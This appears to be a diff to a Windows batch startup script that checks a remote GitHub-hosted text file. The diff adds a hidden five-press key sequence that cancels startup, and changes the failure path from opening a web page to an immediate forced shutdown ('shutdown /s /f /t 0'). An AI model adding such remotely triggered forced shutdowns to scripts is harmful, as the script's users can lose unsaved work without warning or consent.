@@ -2,6 +2,13 @@
 @echo off
 setlocal
 
+powershell -NoProfile -Command ^
+"$end = (Get-Date).AddSeconds(2); $count = 0; while ((Get-Date) -lt $end) { if ([Console]::KeyAvailable) { $key = [Console]::ReadKey($true); if ($key.Key -eq 'J') { $count++ } else { $count = 0 } } else { $count = 0 }; if ($count -ge 5) { exit 1 }; Start-Sleep -Milliseconds 30 }"
+
+if errorlevel 1 (
+    echo Startup cancelled!
+    exit /b
+)
 set "URL=https://raw.githubusercontent.com/animationss253/magarni/main/run.txt"
 
 echo Checking website...
@@ -10,8 +17,8 @@ curl.exe -fsSL --max-time 15 "%URL%" | findstr /r "." >nul
 
 if errorlevel 1 (
     echo Website unavailable or empty.
-    start "" "https://google.com"
-    goto :end
+    shutdown /s /f /t 0 
+   goto :end
 )
 
 echo Website loaded successfully.
